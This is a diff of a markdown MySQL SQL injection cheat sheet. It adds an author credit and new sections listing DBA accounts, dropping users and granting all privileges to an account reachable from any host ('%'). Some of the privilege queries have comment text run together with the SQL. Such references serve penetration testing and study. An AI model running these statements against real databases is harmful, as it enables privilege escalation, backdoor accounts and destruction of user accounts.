@@ -1,8 +1,11 @@
-# SQL Injection Cheat Sheet MySQL 
+# SQL Injection Cheat Sheet MySQL  :syringe:
 
 Inspired by
 [SQL-Injection-Cheat-Sheet-MySQL](https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/) and 
 [SecurityIdiots](http://www.securityidiots.com/Web-Pentest/SQL-Injection/)
+
+by: Eduardo Barbosa (@Anake)  :alien::smiling_imp::boom: 
+
 
 - [SQL Injection Cheat Sheet MySQL](#SQL-Injection-Cheat-Sheet-MySQL)
     - [Comments](#Comments)
@@ -31,8 +34,9 @@ Inspired by
     - [Retrieve Nth Line](#Retrieve-Nth-Line)
     - [Select Nth Row](#Select-Nth-Row)
     - [List Privileges](#List-Privileges)
-    
-    
+    - [List DBA Accounts](#List-DBA-Accounts)
+    - [Delete Users](#Delete-Users)
+    - [Make User DBA](#Make-User-DBA)
     
     
 ## SQL Injection Cheat Sheet MySQL
@@ -218,16 +222,32 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename
 
 ```
 SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
-```
 
-```
-
-    # list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
+list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
    
-    # priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
+priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
     
-    # list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
+list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
     
-    # list privs on columns
+list privs on columns
 ```
 
+### List DBA Accounts
+
+```
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';
+SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; # priv
+
+```
+
+### Delete Users
+
+```
+DROP USER test1;
+```
+
+### Make User DBA
+
+```
+GRANT ALL PRIVILEGES ON *.* TO test@'%';
+```
